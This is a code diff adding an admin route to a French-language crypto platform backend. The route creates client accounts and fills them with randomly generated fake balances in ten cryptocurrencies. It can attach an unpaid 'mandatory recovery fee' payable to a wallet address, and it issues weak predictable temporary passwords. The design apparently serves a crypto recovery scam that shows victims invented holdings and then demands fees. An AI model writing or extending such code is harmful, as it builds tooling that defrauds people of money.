@@ -620,6 +620,96 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Create new client account (Admin only)
+  app.post('/api/admin/create-client', requireAuth('admin'), auditMiddleware('client_creation', 'client'), async (req, res) => {
+    try {
+      const { 
+        email, 
+        fullName, 
+        phone, 
+        address, 
+        country, 
+        amount, 
+        balances,
+        taxConfig 
+      } = req.body;
+      
+      if (!email || !fullName) {
+        return res.status(400).json({ message: 'Email et nom complet requis' });
+      }
+      
+      // Check if client already exists
+      const existingClient = await storage.getClientByEmail(email);
+      if (existingClient) {
+        return res.status(400).json({ message: 'Un client avec cet email existe déjà' });
+      }
+      
+      // Generate temporary password
+      const tempPassword = 'ledger' + Math.random().toString(36).substring(2, 8);
+      const hashedPassword = await bcrypt.hash(tempPassword, 10);
+      
+      // Default balances if not provided
+      const defaultBalances = balances || {
+        btc: parseFloat((Math.random() * 2).toFixed(8)),
+        eth: parseFloat((Math.random() * 10).toFixed(6)),
+        usdt: parseFloat((Math.random() * 5000).toFixed(2)),
+        ada: parseFloat((Math.random() * 1000).toFixed(2)),
+        dot: parseFloat((Math.random() * 100).toFixed(2)),
+        sol: parseFloat((Math.random() * 50).toFixed(2)),
+        link: parseFloat((Math.random() * 100).toFixed(2)),
+        matic: parseFloat((Math.random() * 2000).toFixed(2)),
+        bnb: parseFloat((Math.random() * 10).toFixed(4)),
+        xrp: parseFloat((Math.random() * 1000).toFixed(2))
+      };
+      
+      // Create client
+      const newClient = await storage.createClient({
+        email,
+        password: hashedPassword,
+        fullName,
+        phone: phone || '',
+        address: address || '',
+        country: country || 'France',
+        amount: amount || 50000,
+        balances: defaultBalances,
+        onboardingCompleted: true,
+        kycCompleted: false,
+        riskLevel: 'medium',
+        isActive: true,
+        createdAt: new Date(),
+        updatedAt: new Date()
+      });
+      
+      // Set tax configuration if provided
+      if (taxConfig && taxConfig.amount) {
+        await storage.setClientTax(newClient.id, {
+          amount: parseFloat(taxConfig.amount),
+          currency: taxConfig.currency || 'USDT',
+          walletAddress: taxConfig.walletAddress || '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
+          reason: taxConfig.reason || 'Frais de récupération obligatoires',
+          status: 'unpaid',
+          createdAt: new Date(),
+          adminId: req.session.userId
+        });
+      }
+      
+      res.json({ 
+        message: 'Compte client créé avec succès',
+        client: {
+          id: newClient.id,
+          email: newClient.email,
+          fullName: newClient.fullName,
+          amount: newClient.amount
+        },
+        temporaryPassword: tempPassword,
+        taxConfigured: !!taxConfig?.amount
+      });
+    } catch (error) {
+      console.error('Error creating client:', error);
+      res.status(500).json({ message: 'Erreur lors de la création du compte' });
+    }
+  });
+
   // Reset client password
   app.post('/api/admin/client/:id/reset-password', requireAuth('admin'), auditMiddleware('client_password_reset', 'client'), async (req, res) => {
     try {
